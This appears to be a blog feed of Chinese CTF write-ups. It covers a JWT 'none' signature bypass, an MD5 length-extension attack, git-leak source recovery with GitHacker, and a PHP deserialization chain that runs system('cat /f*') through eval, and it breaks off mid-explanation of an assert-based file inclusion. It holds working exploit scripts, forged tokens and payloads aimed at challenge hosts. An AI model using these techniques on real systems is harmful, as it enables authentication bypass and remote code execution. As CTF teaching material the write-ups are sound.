    <content type="html"><![CDATA[<h1 id="Basectf-no-JWT"><a href="#Basectf-no-JWT" class="headerlink" title="Basectf no JWT"></a>Basectf no JWT</h1><p>考察了 JWT 攻击, 由于没有校验签名, 我们可以采用 None 攻击</p><p>可以利用 JWT 的 None 攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">decoded = jwt.decode(token.split(&quot; &quot;)[1], options=&#123;&quot;verify_signature&quot;: False, &quot;verify_exp&quot;: False&#125;)</span><br><span class="line">    if decoded.get(&#x27;role&#x27;) == &#x27;admin&#x27;:</span><br><span class="line">    # get flag</span><br></pre></td></tr></table></figure><p>我们可以先在 login 接口进行登录, 换取到 jwt</p><p>可以先前往 jwt.io 修改 jwt 信息, 再利用 <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a> 来进行 None 攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrZW5nd2FuZyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjU2MTExM30.Yyol3MbO1oYZd1dMcTTO_L2yMmj8ZxzDUCb7buVIZ3M -X a</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrZW5nd2FuZyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjU2MTExM30.</span><br></pre></td></tr></table></figure><p>将这个 Token 放到 <code>Authorization</code> 头中进行发包即可得到flag</p><p>直接跑脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag_url = &#x27;http://gz.imxbt.cn:20614/flag&#x27; </span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;none&quot;,  # 禁用签名验证</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;sub&quot;: &quot;admin&quot;, </span><br><span class="line">    &quot;role&quot;: &quot;admin&quot;,  # 设置为 admin</span><br><span class="line">    &quot;exp&quot;: 9999999999  # 过期时间设置在未来</span><br><span class="line">&#125;</span><br><span class="line"># 对 header 和 payload 进行 Base64 编码</span><br><span class="line">header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(&quot;=&quot;)</span><br><span class="line">payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">fake_jwt = f&quot;&#123;header_enc&#125;.&#123;payload_enc&#125;.&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Authorization&#x27;: f&#x27;Bearer &#123;fake_jwt&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(flag_url, headers=headers)</span><br><span class="line"></span><br><span class="line"># 打印服务器响应</span><br><span class="line">print(&quot;服务器响应状态码:&quot;, response.status_code)</span><br><span class="line">print(&quot;服务器响应内容:&quot;, response.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Basectf-no-JWT&quot;&gt;&lt;a href=&quot;#Basectf-no-JWT&quot; class=&quot;headerlink&quot; title=&quot;Basectf no JWT&quot;&gt;&lt;/a&gt;Basectf no JWT&lt;/h1&gt;&lt;p&gt;考察了 JWT 攻击, 由于没有校验签名, </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>md5进阶</title>
    <link href="http://1768161086.github,io/2025/03/12/md5%E8%BF%9B%E9%98%B6/"/>
    <id>http://1768161086.github,io/2025/03/12/md5%E8%BF%9B%E9%98%B6/</id>
    <published>2025-03-12T13:34:40.000Z</published>
    <updated>2025-03-12T13:40:02.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basectf-你真的懂md5吗"><a href="#Basectf-你真的懂md5吗" class="headerlink" title="Basectf 你真的懂md5吗"></a>Basectf 你真的懂md5吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 所以你说你懂 MD5 了?</span><br><span class="line"></span><br><span class="line">$apple = $_POST[&#x27;apple&#x27;];</span><br><span class="line">$banana = $_POST[&#x27;banana&#x27;];</span><br><span class="line">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;</span><br><span class="line">    die(&#x27;加强难度就不会了?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 什么? 你绕过去了?</span><br><span class="line">// 加大剂量!</span><br><span class="line">// 我要让他成为 string</span><br><span class="line">$apple = (string)$_POST[&#x27;appple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;bananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;难吗?不难!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你还是绕过去了?</span><br><span class="line">// 哦哦哦, 我少了一个等于号</span><br><span class="line">$apple = (string)$_POST[&#x27;apppple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;banananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你以为这就结束了</span><br><span class="line">if (!isset($_SESSION[&#x27;random&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你想看到 random 的值吗?</span><br><span class="line">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="line">$random = $_SESSION[&#x27;random&#x27;];</span><br><span class="line">echo md5($random);</span><br><span class="line">echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;</span><br><span class="line"></span><br><span class="line">// check if name ends with &#x27;admin&#x27;</span><br><span class="line">if (substr($name, -5) !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    die(&#x27;不是管理员也来凑热闹?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line">if (md5($random . $name) !== $md5) &#123;</span><br><span class="line">    die(&#x27;伪造? NO NO NO!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 认输了, 看样子你真的很懂 MD5</span><br><span class="line">// 那 flag 就给你吧</span><br><span class="line">echo &quot;看样子你真的很懂 MD5&quot;;</span><br><span class="line">echo file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure><p>最后两步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack, unpack</span><br><span class="line">from math import floor, sin</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">MD5 Extension Attack</span><br><span class="line">====================</span><br><span class="line">@refs</span><br><span class="line">https://github.com/shellfeel/hash-ext-attack</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class MD5:</span><br><span class="line"> </span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.A, self.B, self.C, self.D = \</span><br><span class="line">            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values</span><br><span class="line">        self.r: list[int] = \</span><br><span class="line">            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \</span><br><span class="line">            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values</span><br><span class="line">        self.k: list[int] = \</span><br><span class="line">            [floor(abs(sin(i + 1)) * pow(2, 32))</span><br><span class="line">             for i in range(64)]  # constants</span><br><span class="line"> </span><br><span class="line">    def _lrot(self, x: int, n: int) -&gt; int:</span><br><span class="line">        # left rotate</span><br><span class="line">        return (x &lt;&lt; n) | (x &gt;&gt; 32 - n)</span><br><span class="line"> </span><br><span class="line">    def update(self, chunk: bytes) -&gt; None:</span><br><span class="line">        # update the hash for a chunk of data (64 bytes)</span><br><span class="line">        w = list(unpack(&#x27;&lt;&#x27;+&#x27;I&#x27;*16, chunk))</span><br><span class="line">        a, b, c, d = self.A, self.B, self.C, self.D</span><br><span class="line"> </span><br><span class="line">        for i in range(64):</span><br><span class="line">            if i &lt; 16:</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">                flag = i</span><br><span class="line">            elif i &lt; 32:</span><br><span class="line">                f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">                flag = (5 * i + 1) % 16</span><br><span class="line">            elif i &lt; 48:</span><br><span class="line">                f = (b ^ c ^ d)</span><br><span class="line">                flag = (3 * i + 5) % 16</span><br><span class="line">            else:</span><br><span class="line">                f = c ^ (b | (~d))</span><br><span class="line">                flag = (7 * i) % 16</span><br><span class="line"> </span><br><span class="line">            tmp = b + \</span><br><span class="line">                self._lrot((a + f + self.k[i] + w[flag])</span><br><span class="line">                           &amp; 0xffffffff, self.r[i])</span><br><span class="line">            a, b, c, d = d, tmp &amp; 0xffffffff, b, c</span><br><span class="line"> </span><br><span class="line">        self.A = (self.A + a) &amp; 0xffffffff</span><br><span class="line">        self.B = (self.B + b) &amp; 0xffffffff</span><br><span class="line">        self.C = (self.C + c) &amp; 0xffffffff</span><br><span class="line">        self.D = (self.D + d) &amp; 0xffffffff</span><br><span class="line"> </span><br><span class="line">    def extend(self, msg: bytes) -&gt; None:</span><br><span class="line">        # extend the hash with a new message (padded)</span><br><span class="line">        assert len(msg) % 64 == 0</span><br><span class="line">        for i in range(0, len(msg), 64):</span><br><span class="line">            self.update(msg[i:i + 64])</span><br><span class="line"> </span><br><span class="line">    def padding(self, msg: bytes) -&gt; bytes:</span><br><span class="line">        # pad the message</span><br><span class="line">        length = pack(&#x27;&lt;Q&#x27;, len(msg) * 8)</span><br><span class="line"> </span><br><span class="line">        msg += b&#x27;\x80&#x27;</span><br><span class="line">        msg += b&#x27;\x00&#x27; * ((56 - len(msg)) % 64)</span><br><span class="line">        msg += length</span><br><span class="line"> </span><br><span class="line">        return msg</span><br><span class="line"> </span><br><span class="line">    def digest(self) -&gt; bytes:</span><br><span class="line">        # return the hash</span><br><span class="line">        return pack(&#x27;&lt;IIII&#x27;, self.A, self.B, self.C, self.D)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def verify_md5(test_string: bytes) -&gt; None:</span><br><span class="line">    # (DEBUG function) verify the MD5 implementation</span><br><span class="line">    from hashlib import md5 as md5_hashlib</span><br><span class="line"> </span><br><span class="line">    def md5_manual(msg: bytes) -&gt; bytes:</span><br><span class="line">        md5 = MD5()</span><br><span class="line">        md5.extend(md5.padding(msg))</span><br><span class="line">        return md5.digest()</span><br><span class="line"> </span><br><span class="line">    manual_result = md5_manual(test_string).hex()</span><br><span class="line">    hashlib_result = md5_hashlib(test_string).hexdigest()</span><br><span class="line"> </span><br><span class="line">    assert manual_result == hashlib_result, &quot;Test failed!&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def attack(message_len: int, known_hash: str,</span><br><span class="line">           append_str: bytes) -&gt; tuple:</span><br><span class="line">    # MD5 extension attack</span><br><span class="line">    md5 = MD5()</span><br><span class="line"> </span><br><span class="line">    previous_text = md5.padding(b&quot;*&quot; * message_len)</span><br><span class="line">    current_text = previous_text + append_str</span><br><span class="line"> </span><br><span class="line">    md5.A, md5.B, md5.C, md5.D = unpack(&quot;&lt;IIII&quot;, bytes.fromhex(known_hash))</span><br><span class="line">    md5.extend(md5.padding(current_text)[len(previous_text):])</span><br><span class="line"> </span><br><span class="line">    return current_text[message_len:], md5.digest().hex()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> </span><br><span class="line">    message_len = int(input(&quot;[&gt;] Input known text length: &quot;))</span><br><span class="line">    known_hash = input(&quot;[&gt;] Input known hash: &quot;).strip()</span><br><span class="line">    append_text = input(&quot;[&gt;] Input append text: &quot;).strip().encode()</span><br><span class="line"> </span><br><span class="line">    print(&quot;[*] Attacking...&quot;)</span><br><span class="line"> </span><br><span class="line">    extend_str, final_hash = attack(message_len, known_hash, append_text)</span><br><span class="line"> </span><br><span class="line">    from urllib.parse import quote</span><br><span class="line">    from base64 import b64encode</span><br><span class="line"> </span><br><span class="line">    print(&quot;[+] Extend text:&quot;, extend_str)</span><br><span class="line">    print(&quot;[+] Extend text (URL encoded):&quot;, quote(extend_str))</span><br><span class="line">    print(&quot;[+] Extend text (Base64):&quot;, b64encode(extend_str).decode())</span><br><span class="line">    print(&quot;[+] Final hash:&quot;, final_hash)</span><br></pre></td></tr></table></figure><p>运行脚本获取random的hash值得到经过扩展的hash值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Basectf-你真的懂md5吗&quot;&gt;&lt;a href=&quot;#Basectf-你真的懂md5吗&quot; class=&quot;headerlink&quot; title=&quot;Basectf 你真的懂md5吗&quot;&gt;&lt;/a&gt;Basectf 你真的懂md5吗&lt;/h2&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>git泄露</title>
    <link href="http://1768161086.github,io/2025/03/12/git%E6%B3%84%E9%9C%B2/"/>
    <id>http://1768161086.github,io/2025/03/12/git%E6%B3%84%E9%9C%B2/</id>
    <published>2025-03-12T11:11:29.000Z</published>
    <updated>2025-03-30T05:47:31.799Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h2 id="Back-to-the-Future"><a href="#Back-to-the-Future" class="headerlink" title="Back to the Future"></a>Back to the Future</h2></blockquote><p>本题考查了 Git 泄露和 git 的一些基本操作</p><p>1.我们打开后可以看到什么都没有, 我们可以考虑进行目录扫描或者直接看 <code>robots.txt</code></p><p>可以看到存在 <code>.git</code> 文件夹, 我们可以通过 <code>GitHacker</code> 来获取 <code>.git</code> 的全部内容</p><p>2.克隆GitHacker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WangYihang/GitHacker</span><br></pre></td></tr></table></figure><p>3.下载GitHacker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -i https://pypi.org/simple/ GitHacker</span><br></pre></td></tr></table></figure><p>（一定要在含有【<strong>requirements.txt</strong>】这个文件的目录下载）：</p><p>4.执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://challenge.basectf.fun:35137/ --output back-future</span><br></pre></td></tr></table></figure><p>随后会生成一个文件夹，名字就是由此命令的最后一个参数设置的，存放在我们执行此命令的路径</p><p>5.下一步需要进入到这个文件夹的<strong>一个子文件夹</strong>，可以用cd命令进行切换，也可以鼠标双击打开此文件夹-&gt;右键-&gt;在此打开终端</p><p>6.输入【<strong>git log</strong>】命令，看到这个”add flag”的版本</p><p>7.找到含有flag信息的版本后</p><p>使用命令【<strong>git diff或者checkout + 版本commit</strong>】查看信息改动，获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 9d85f10e0192ef630e10d7f876a117db41c30417</span><br></pre></td></tr></table></figure><h2 id="Polar2024冬季-ezezser"><a href="#Polar2024冬季-ezezser" class="headerlink" title="Polar2024冬季_ezezser"></a>Polar2024冬季_ezezser</h2><p>1.dirsearch扫描到git泄露</p><p>2.使用kali命令下载源码到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://8f1b9150-1881-4943-92f8-4196742fec0e.www.polarctf.com:8090/.git/ --output 123</span><br></pre></td></tr></table></figure><p>3.然后查看git的详细记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show</span><br></pre></td></tr></table></figure><p>找到一些不同的内容，完整源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$polarday=$_GET[&#x27;polarday&#x27;];</span><br><span class="line">$polarnight=$_GET[&#x27;polarnight&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($polarday) &amp;&amp; isset($polarnight))&#123;</span><br><span class="line">    $polar520 = unserialize($_COOKIE[&#x27;polar520&#x27;]);</span><br><span class="line">    $polar520&gt;login($polarday,$polarnight);</span><br><span class="line">&#125;</span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $key;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this&gt;key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class info&#123;</span><br><span class="line">        private $polar520=&#x27;nukaka&#x27;;</span><br><span class="line">        public function getInfo()&#123;</span><br><span class="line">            return $this&gt;polar520;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class polar520&#123;</span><br><span class="line">        private $polarday=&#x27;nukaka&#x27;;</span><br><span class="line">        private $polarnight=&#x27;nukaka&#x27;;</span><br><span class="line">        private $polar=false;</span><br><span class="line">        private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this&gt;class=new info();</span><br><span class="line">        &#125;</span><br><span class="line">        public function login($a,$b)&#123;</span><br><span class="line">            return $this&gt;polarday===$a&amp;&amp;$this&gt;polarnight===$b;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            $this&gt;class&gt;getInfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>4.构造php 反序列化链:<br>从destruct触发然后调用backDoor类的后门函数，需要url编码传进cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($polarday) &amp;&amp; isset($polarnight)) &#123;</span><br><span class="line">    $polar520 = unserialize($_COOKIE[&#x27;polar520&#x27;]);</span><br><span class="line">    $polar520-&gt;login($polarday, $polarnight);</span><br><span class="line">&#125;</span><br><span class="line">class backDoor</span><br><span class="line">&#123;</span><br><span class="line">    private $key;</span><br><span class="line">    public function getInfo()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key = &quot;system(&#x27;cat /f*&#x27;);&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class info</span><br><span class="line">&#123;</span><br><span class="line">    private $polar520 = &#x27;nukaka&#x27;;</span><br><span class="line">    public function getInfo()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;polar520;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class polar520</span><br><span class="line">&#123;</span><br><span class="line">    private $polarday = &#x27;nukaka&#x27;;</span><br><span class="line">    private $polarnight = &#x27;nukaka&#x27;;</span><br><span class="line">    private $polar = false;</span><br><span class="line">    private $class;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function login($a, $b)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;polarday === $a &amp;&amp; $this-&gt;polarnight === $b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class = new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new polar520();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>5.get传入polarday和polarnight为1</p><h2 id="攻防设计界-mfw"><a href="#攻防设计界-mfw" class="headerlink" title="攻防设计界__mfw"></a>攻防设计界__mfw</h2><p>1.扫描目录发现是git泄露，执行上诉命令</p><p>2.发现flag.php,打开发现无内容</p><p>3.打开index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">    $page = $_GET[&#x27;page&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">// TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br></pre></td></tr></table></figure><p>4.执行git show发现flag目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/templates/flag.php b/templates/flag.php</span><br><span class="line">new file mode 100755</span><br><span class="line">index 0000000..f8c9436</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/templates/flag.php</span><br></pre></td></tr></table></figure><p>5.assert函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br><span class="line">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动</span><br><span class="line">or 操作符:如果 assert(abc) 结果为 false，PHP 